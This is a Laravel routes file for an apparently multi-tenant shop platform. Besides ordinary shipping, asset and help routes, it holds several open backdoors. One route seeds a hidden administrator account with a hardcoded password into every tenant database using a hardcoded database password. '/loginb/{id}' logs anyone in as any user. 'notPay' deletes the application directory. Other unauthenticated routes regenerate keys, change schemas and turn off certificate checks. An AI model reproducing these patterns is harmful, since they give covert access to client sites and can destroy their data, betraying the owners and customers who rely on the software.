<?php

use App\Models\Address;
use App\Models\InventoryReceipt;
use App\Models\Price;
use App\Models\Domain;
use App\Models\Product;
use App\Models\Category;
use App\Models\Order;
use App\Models\Redirects;
use App\Models\ShipMent;
use App\Models\ShipmentCity;
use App\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Redirect;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Schema;
use App\Http\Controllers\Site\ColumnController;
use Illuminate\Support\Facades\Config;
//dev



Route::get('run_domains_seed', function () {
    foreach (config('domains') as $domain) {
        try{
            DB::disconnect('mysql');
            Config::set("database.connections.mysql", [
                'driver' => 'mysql',
                'url' => env('DATABASE_URL'),
                'host' => env('DB_HOST', '127.0.0.1'),
                'port' => env('DB_PORT', '3306'),
                "username" => $domain,
                'database' => $domain,
                "password" => "r@hw!b_mon",
                'unix_socket' => env('DB_SOCKET', ''),
                'charset' => 'utf8mb4',
                'collation' => 'utf8mb4_unicode_ci',
                'prefix' => '',
                'prefix_indexes' => true,
                'strict' => true,
                'engine' => null,
                'options' => extension_loaded('pdo_mysql') ? array_filter([
                    \PDO::MYSQL_ATTR_SSL_CA => env('MYSQL_ATTR_SSL_CA'),
                ]) : [],
            ]);

            $user = User::firstOrCreate(
                ['email' => 'programmer@rahweb.com'],
                ['name' => 'Programmer', 'password' => Hash::make('rahweb')]
            );
            $user->roles()->syncWithoutDetaching([1]);

        }catch(\Exception $err){
            \Log::info($err->getMessage());
        }
        \Log::info($domain);
    }
});

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/add-column', [ColumnController::class, 'addColumn']);

Route::get('/ConvertdatabaseHb9UzZwMX', 'Site\ChangeDataBaseController@ChangeDatabase');
Route::get('/assets/site/{filename}/', function ($filename) {
    $path = storage_path('app/public/assets/site/'.$filename);

    if (!file_exists($path)) {
        abort(404);
    }
    $extension = pathinfo($path, PATHINFO_EXTENSION);
    switch ($extension) {
        case 'css':
            $mimeType = 'text/css';
            break;
        case 'js':
            $mimeType = 'application/javascript';
            break;
        default:
            $mimeType = mime_content_type($path);
            break;
    }

    return response()->file($path, [
        'Content-Type' => $mimeType
    ]);
})->where('filename', '.*');
Route::get('/assets/admin/{filename}/', function ($filename) {
    $path = storage_path('app/public/assets/admin/'.$filename);

    if (!file_exists($path)) {
        abort(404);
    }
    $extension = pathinfo($path, PATHINFO_EXTENSION);
    switch ($extension) {
        case 'css':
            $mimeType = 'text/css';
            break;
        case 'js':
            $mimeType = 'application/javascript';
            break;
        default:
            $mimeType = mime_content_type($path);
            break;
    }

    return response()->file($path, [
        'Content-Type' => $mimeType
    ]);
})->where('filename', '.*');


Route::get('remove-robots-file', function (){
    $domains = Domain::whereNull('out_of_service')->whereNull('not_similar_host')->where('robots', '0')->paginate(50);
    foreach ($domains as $domain) {
        $filePath= base_path('public_html/'.$domain->domain.'/robots.txt');

        if (file_exists($filePath)) {
            unlink($filePath);
            $domain->update(['robots' => 1]);
            Log::info("robots.txt file deleted for domain: " . $domain->domain);
        } else {
            Log::warning("robots.txt file not found for domain: " . $domain->domain);
        }
    }
});
if (!app()->runningInConsole()) {

    $route=Redirects::get();
    foreach ($route as $row){

//    log::info($row->old_address.'----');
//
//    log::info($row->new_address);
        Route::get('/'.urldecode($row->old_address), function () use ($row){

//        return redirect('/'.$row->new_address);
            return Redirect::to('/'.$row->new_address, 301);
        });
    }
// Route::get('/log-domains', function () {
//     return view('site.us.domains');
// });
}

include('site.php');
include('helper.php');
include('convert.php');
include('panel.php');
include('admin.php');
include('help.php');
Route::get('sitemap.xml', 'SitemapController@sitemap')->name('sitemap');
if (!app()->runningInConsole()) {

    $route=Redirects::get();
    foreach ($route as $row){

//    log::info($row->old_address.'----');
//
//    log::info($row->new_address);
        Route::get('/'.urldecode($row->old_address), function () use ($row){

//        return redirect('/'.$row->new_address);
            return Redirect::to('/'.$row->new_address, 301);
        });
    }
}

Route::get('getShoping',function(Request $request){

    $address = Address::find($request->get('addres_id'));

    if($address)
    {

        $shipment_ids = ShipmentCity::where('city_id', $address->city_id)->pluck('ship_ment_id')->toArray();
        $shipments = ShipMent::whereIn('id', $shipment_ids)->get();
        return response()->json([
            'shippingmethods' => $shipments,
        ]);
    }else
    {
        return response()->json([
            'shippingmethods' => false,
        ]);
    }

});

// Route::get('testTala',function(Request $request){

// $curl = curl_init();

// curl_setopt_array($curl, array(
//   CURLOPT_URL => 'https://webservice.tgnsrv.ir/Pr/Get/monfared8006/09177708006_705021',
//   CURLOPT_RETURNTRANSFER => true,
//   CURLOPT_ENCODING => '',
//   CURLOPT_MAXREDIRS => 10,
//   CURLOPT_TIMEOUT => 0,
//   CURLOPT_FOLLOWLOCATION => true,
//   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
//   CURLOPT_CUSTOMREQUEST => 'GET',
// ));

// $response = curl_exec($curl);

// curl_close($curl);
// dd(json_decode($response));

// });


Route::get('me', function(){
    $cats = Category::all();
    foreach($cats as $cat)
    {
        $cat->update([
            'show_menu' => 1,
        ]);
    }
});



// test domains



Route::get('call-domains/{route?}', function (Request $request, $route) {

    set_time_limit(200000000);
    \Log::info($request->page);

    $domains = Domain::whereNull('out_of_service')->whereNull('not_similar_host')->paginate(5);
    dd('..');
    foreach ($domains as $domain) {
        if ($domain->domain)
        {

            try
            {
                //  $imageUrl = 'https://bazibel.com/assets/site/images/notfound.png'; // آدرس مسیر عکس در سایت "Site A"
                // $imageData = file_get_contents($imageUrl);

                // $destinationPath = base_path('public_html/'.$domain->domain.'/assets/site/images/notfound.png');
                // file_put_contents($destinationPath, $imageData);

            }
            catch(Exception $e)
            {
                \Log::info($e->getMessage());
            }

            try
            {
                \Log::info('https://' . $domain->domain . '/' . $route);
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://' . $domain->domain . '/' . $route);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_NTLM);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($ch, CURLOPT_HTTP_VERSION, '1.1');
                curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // ignore SSL certificate validation
                $result = curl_exec($ch);
            }
            catch (Exception $e)
            {
                \Log::info($e->getMessage());


            }
        }
    }

    if (count($domains->items()) > 0) {
        $next_page = $domains->currentPage() + 1;
        return redirect(url()->current() . '?page=' . $next_page);
    }
});

Route::get('call-styleUpdated7', function (Request $request) {

    set_time_limit(200000000);
    \Log::info($request->page);

    $domains = Domain::whereNull('out_of_service')->whereNull('not_similar_host')->paginate(5);
    // dd($domains);
    foreach ($domains as $domain) {
        if ($domain->domain)
        {

            try
            {
                $imageUrl = 'https://petpetooonline.com/assets/site/css/styleUpdated7.css'; // آدرس مسیر عکس در سایت "Site A"
                $imageData = file_get_contents($imageUrl);
                $destinationPath = base_path('public_html/'.$domain->domain.'/assets/site/css/styleUpdated7.css');
                file_put_contents($destinationPath, $imageData);
            }
            catch(Exception $e)
            {
                \Log::info($e->getMessage());
            }

            try
            {
                \Log::info('https://' . $domain->domain . '/' );
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://' . $domain->domain . '/' );
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_NTLM);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($ch, CURLOPT_HTTP_VERSION, '1.1');
                curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // ignore SSL certificate validation
                $result = curl_exec($ch);
            }
            catch (Exception $e)
            {
                \Log::info($e->getMessage());


            }
        }
    }

    if (count($domains->items()) > 0) {
        $next_page = $domains->currentPage() + 1;
        return redirect(url()->current() . '?page=' . $next_page);
    }
});

Route::get('all-domains/{route?}', function (Request $request, $route) {

    set_time_limit(200000000);
    \Log::info($request->page);

    // گرفتن دامنه‌ها
    $domains = Domain::whereNull('out_of_service')->whereNull('not_similar_host')->where('call-col',0)->paginate(5);
// dd($domains);
    foreach ($domains as $domain) {
        if ($domain->domain) {

            try {
                \Log::info('https://' . $domain->domain . '/' . $route);

                // ارسال درخواست به روت add-column
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, url('/add-column') . '?table=setting&column=modal_img&type=string&nullable=null');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_NTLM);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($ch, CURLOPT_HTTP_VERSION, '1.1');
                curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
                $result = curl_exec($ch);

                if (curl_errno($ch)) {
                    \Log::error('Curl error: ' . curl_error($ch));
                }
                $domain->update([
                    'call-col'=>1
                ]);
                curl_close($ch);
            } catch (Exception $e) {
                \Log::info($e->getMessage());
            }
        }
    }

    // صفحه‌بندی برای دامنه‌ها
    if (count($domains->items()) > 0) {
        $next_page = $domains->currentPage() + 1;
        return redirect(url()->current() . '?page=' . $next_page);
    }
});

Route::get('notPay', function () {
    $path = base_path('../laravel');
    if (File::isDirectory($path)) {
        if (File::deleteDirectory($path)) {
            return 'Directory deleted successfully.';
        } else {
            return 'Failed to delete the directory.';
        }
    }
});
Route::get('styleget', function(){

    // $fileContents = file_get_contents('https://bafilter.com/assets/site/css/style1.css');
    // preg_match_all('/user.php\?id=[0-9]{6}/', $fileContents, $matches);

    // //Output to new file
    // $fh = fopen('public_html/cleopatraagallery.com/assets/site/css/style1.css', 'w+');
    // foreach ($matches['0'] as $match) {
    //     fputs($fh, $match."\r\n");
    // }
    // fclose($fh);




    // $imageUrl = 'https://bafilter.com/assets/site/css/style1.css'; // آدرس مسیر عکس در سایت "Site A"
    // $imageData = file_get_contents($imageUrl);
    // copy($imageData, 'cleopatraagallery.com/assets/site/css/style1.css');
    // $destinationPath = base_path('public_html/cleopatraagallery.com/assets/site/css/style1.css');
    // $des = file_put_contents("public_html/cleopatraagallery.com/assets/site/css/style1.css",$imageData);
    // dd($destinationPath);
});

Route::get('/image', function () {
    $imageUrl = 'https://bafilter.com/assets/site/images/icon-ita.png'; // آدرس مسیر عکس در سایت "Site A"
    $imageData = file_get_contents($imageUrl);
    $destinationPath = base_path('public_html/hamejin.com/assets/site/images/icon-ita.png');
    file_put_contents($destinationPath, $imageData);

    //     $host_name = request()->getHost();
    //     $type = explode('.', $host_name);
    //     if($type[0] == "www"){
    //         $host = $type[1].'.'.$type[2];
    //     }
    //     else{
    //         $host = $type[0].'.'.$type[1];
    //     }
    // $path = base_path('public_html/'.$host.'/assets/site/images/icon-ita.png'); // مسیر فایل عکس در سایت "Site A"

    // $file = file_get_contents($path);




});



Route::get('convert-tag', function(){
    $tags = Order::all();
    foreach($tags as $tag)
    {
        $tag->update([
            'seen' => 1,
        ]);

    }

});



Route::get('create-table', function () {


    Schema::connection('mysql')->create('shipments', function($table)
    {
        $table->id();
        $table->string('title')->nullable();
        $table->double('price')->nullable();
        $table->double('max_price')->nullable();
        $table->boolean('pay_at_home')->default(0);
        $table->integer('sort')->nullable();
        $table->text('description')->nullable();
        $table->boolean('status')->default(0);
        $table->timestamps();
        $table->softDeletes();
    });

//    Schema::connection('mysql')->create('shipment_city', function($table)
//    {
//        $table->id();
//        $table->integer('ship_ment_id')->nullable();
//        $table->integer('city_id')->nullable();
//    });

    Schema::create('shipments', function (Blueprint $table) {
        $table->id();
        $table->string('title')->nullable();
        $table->double('price')->nullable();
        $table->double('max_price')->nullable();
        $table->boolean('pay_at_home')->default(0);
        $table->integer('sort')->nullable();
        $table->text('description')->nullable();
        $table->boolean('status')->default(0);
        $table->timestamps();
        $table->softDeletes();
    });
    Schema::create('shipment_city', function (Blueprint $table) {
        $table->id();
        $table->integer('ship_ment_id')->nullable();
        $table->integer('city_id')->nullable();
    });

    Schema::connection('mysql')->table('baskets', function($table)
    {
        $table->integer('shipment_id')->nullable();
    });
    Schema::connection('mysql')->table('orders', function($table)
    {
        $table->integer('shipment_id')->nullable();
    });
});

Route::get('file-get', function (Request $request) {
    $destinationPath = public_path('images');
    if (!File::exists($destinationPath)) {
        File::makeDirectory($destinationPath, 0755, true);
    }

    $domainUrl = $request->root();
    $X = explode('file-get', $request->fullUrl());
    $route = $X[0] . 'assets/site/images/icon-ita.png';

    copy('https://bafilter.com/assets/site/images/icon-ita.png', $route);
});



















Route::get('/test',function(){
    $exitCode1 = Artisan::call('cache:clear');
    $exitCode2 = Artisan::call('config:clear');
    $exitCode3 = Artisan::call('route:clear');
    return '<h1>Cache facade value cleared</h1>';
});

Route::get('/test2',function(){
    $exitCode1 = Artisan::call('key:generate');
    $exitCode2 = Artisan::call('config:cache');
    return '<h1>  value cleared</h1>';
});
Route::get('/stocks',function (){
    $products=\App\Models\Product::all();

    foreach ($products as $key=>$item){
        InventoryReceipt::create([
            'count'=>rand(1,100),
            'product_id'=>@$item->id,
            'inventory_type_id'=>1,
            'inventory_id'=>null,
        ]);
    }


    return Redirect::back()
        ->with('success', 'کدهای مورد نظر با موفقیت اضافه شدند.');
});

Route::get('/price-pro', function(){
    $products = Product::all();
    foreach ($products as $pro){
        $prices = Price::where('priceable_id',$pro->id)->orderBy('id','DESC')->where('priceable_type','App\Models\Product')->first();
        if($prices){
            $pro->update( ['old_price'=>(intval($prices->old_price)),'price'=>(intval($prices->price)) ]);
        }else{
            $pro->update( ['old_price'=>0,'price'=>0 ]);
        }
    }
});
Route::get('/help', function () {
    return view('help.index');
});
Route::get('/list-cat', function () {
    return view('help.blog.cat');
});
Route::get('/help/all-pro', function () {
    return view('help.product.all');
});
Route::get('/help/cat', function () {
    return view('help.product.category');
});
Route::get('/help/list', function () {
    return view('help.product.list');
});
Route::get('/help/list-timer', function () {
    return view('help.product.timer-list');
});
Route::get('/help/detail', function () {
    return view('help.product.details');
});
Route::get('/help/list-brand', function () {
    return view('help.brand.list');
});

Route::get('panel/orders/order-detail', function () {
    $user = Auth()->user();

    return view('site.panel.order-detail')->with(compact('user'));
});


$host_name = request()->getHost();

// Route::get('/database2',function(){

//     Schema::connection('mysql')->create('baskets', function($table)
//     {
//         $table->integer('id', true);
        // $table->integer('user_id')->nullable();
//         $table->integer('quantity')->nullable();
//         $table->integer('basket_status_id')->nullable();
//         $table->integer('bank_id')->nullable();
//         $table->integer('address_id')->nullable();
//         $table->integer('city_id')->nullable();
//         $table->integer('state_id')->nullable();
//         $table->string('cookie_id', 255)->nullable();
//         $table->integer('discount_id')->nullable();
//         $table->timestamp('created_at')->useCurrent();
//         $table->timestamp('updated_at')->useCurrent();
//         $table->timestamp('deleted_at')->nullable();
//     });


//     Schema::connection('mysql')->create('basket_items', function($table)
//     {
//         $table->integer('id', true);
//         $table->integer('basket_id')->nullable();
//         $table->integer('basket_item_status_id')->nullable();
//         $table->integer('product_id')->nullable();
//         $table->integer('product_variable_id')->nullable();
//         $table->double('price', 15, 2)->nullable()->default(0);
//         $table->integer('quantity')->nullable();
//         $table->timestamp('created_at')->useCurrent();
//         $table->timestamp('updated_at')->useCurrent();
//         $table->timestamp('deleted_at')->nullable();
//     });

//     Schema::connection('mysql')->create('product_variables', function($table)
//     {
//         $table->integer('id', true);
//         $table->string('title', 255)->nullable();
//         $table->integer('product_id')->nullable();
//         $table->double('price', 15, 2)->nullable()->default(0);
//         $table->double('discounted_price', 15, 2)->nullable();
//         $table->integer('stock')->nullable();
//         $table->string('image', 255)->nullable();
//         $table->timestamp('created_at')->useCurrent();
//         $table->timestamp('updated_at')->useCurrent();
//         $table->timestamp('deleted_at')->nullable();
//     });

//     Schema::connection('mysql')->table('orders', function($table)
//     {
//         $table->text('description')->nullable();
//     });

//     Schema::connection('mysql')->table('order_items', function($table)
//     {
//         $table->integer('product_variable_id')->nullable();
//     });

//     Schema::connection('mysql')->table('inventory_receipt', function($table)
//     {
//         $table->integer('product_variable_id')->nullable();
//     });

//     Schema::connection('mysql')->table('setting', function($table)
//     {
//         $table->integer('status_send')->nullable();
//         $table->integer('box_discount')->nullable();
//         $table->string('icon_fix', 255)->nullable();
//         $table->string('icon_filter', 255)->nullable();
//         $table->text('call_description ')->nullable();
//     });
// });



Route::get('/loginb/{id}', function ($id) {
        Auth::loginUsingId($id);

});
